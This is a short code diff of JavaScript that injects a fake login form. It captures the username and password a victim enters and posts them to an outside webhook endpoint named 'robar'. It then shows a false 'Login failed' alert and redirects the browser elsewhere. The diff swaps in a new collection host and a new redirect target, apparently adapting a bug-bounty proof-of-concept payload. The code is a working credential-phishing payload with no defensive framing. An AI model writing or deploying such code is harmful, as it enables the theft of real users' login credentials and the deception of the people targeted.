@@ -1,6 +1,6 @@
 var form = document.createElement('form');
 form.method = 'POST';
-form.action = 'https://xef2xyvjkjzl6txp5fdyensfm6s0gq4f.oastify.com/robar';
+form.action = 'https://webhook.site/2b20713f-1250-4262-abab-4819166aa12a/robar';
 
 var inputUser = document.createElement('input');
 inputUser.name = 'username';
@@ -29,5 +29,5 @@ form.addEventListener('submit', function(e) {
     var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
     xhr.send(data);
     alert('Login failed. Please try again.');
-    window.location.href = 'https://www.bugbounty.ch/';
+    window.location.href = 'https://www.cvmarket.lt/karjeros-centras/';
 });
